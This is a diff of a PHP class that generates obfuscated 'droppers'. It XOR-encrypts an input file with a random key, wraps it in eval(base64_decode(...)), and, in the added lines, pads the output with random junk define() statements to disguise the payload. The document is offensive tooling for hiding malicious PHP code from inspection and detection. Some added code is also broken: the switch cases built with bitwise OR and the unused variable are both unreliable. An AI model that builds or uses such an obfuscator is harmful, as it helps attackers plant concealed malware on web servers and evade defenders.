@@ -1,11 +1,35 @@
 <?php
 
-define("o", "droppers/dynamic/obfuscated");
-define("p", "droppers/dynamic/raw");
 class dynamic_generator
 {
     private function randomString(){
-        return "#" . bin2hex(random_bytes(rand(5,25)));
+        switch (rand(0,15)){
+            case 0:
+                $a = "";
+                break;
+            case 1|3|5|7|9:
+                $a = "1";
+                break;
+            case 2|4|6|8|10:
+                $a = "2";
+                break;
+            case 11:
+                $a = "3";
+                break;
+            case 12:
+                $a = "4";
+                break;
+            case 13:
+                $a = "5";
+                break;
+            case 14:
+                $a = "6";
+                break;
+            case 15:
+                $a = "7";
+                break;
+        }
+        return "define('". bin2hex(random_bytes(rand(5,10))) . "', \"" . bin2hex(random_bytes(rand(5,100))) . "\");\n";
     }
 
     private function junkCodeGen($seek_to_line){
@@ -99,7 +123,11 @@ class dynamic_generator
             }
             switch (strtolower($mode)){
                 case "ob":
-                    $key = bin2hex(openssl_random_pseudo_bytes(rand(32,64)));
+                    fputs(fopen($out, "a+"), "<?php\n");
+                    for ($i = 0; $i < $depth; $i++) {
+                        fputs(fopen($out, "a+"), $this->randomString());
+                    }
+                    $key = bin2hex(random_bytes(rand(32,64)));
                     echo "Key: {$key}\nKey length: ". strlen($key)."\n";
                     $i = 0;
                     $encrypted = '';
@@ -107,7 +135,7 @@ class dynamic_generator
                     foreach (str_split($text) as $char) {
                         $encrypted .= chr(ord($char) ^ ord($key{$i++ % strlen($key)}));
                     }
-                    fputs(fopen($out, "a+"), "<?php eval(base64_decode(\"" . base64_encode($encrypted) . "\"));");
+                    fputs(fopen($out, "a+"), "eval(base64_decode(\"" . base64_encode($encrypted) . "\"));");
                     break;
                 default:
                     fputs(fopen($out, "a+"), "<?php eval(base64_decode(\"" .base64_encode(implode("", $b_encoded)) . "\"));");
@@ -115,7 +143,7 @@ class dynamic_generator
         }else{
             $required_params = array();
             if (empty($mode)){
-                array_push($required_params, ("mode cannot be empty. Please use either O for obfuscation or P for plain."));
+                array_push($required_params, ("mode cannot be empty. Please use either ob for obfuscation or n for plain."));
             }else if (empty($file)){
                 array_push($required_params, "file cannot be empty.");
             }else if (!is_file($file)){
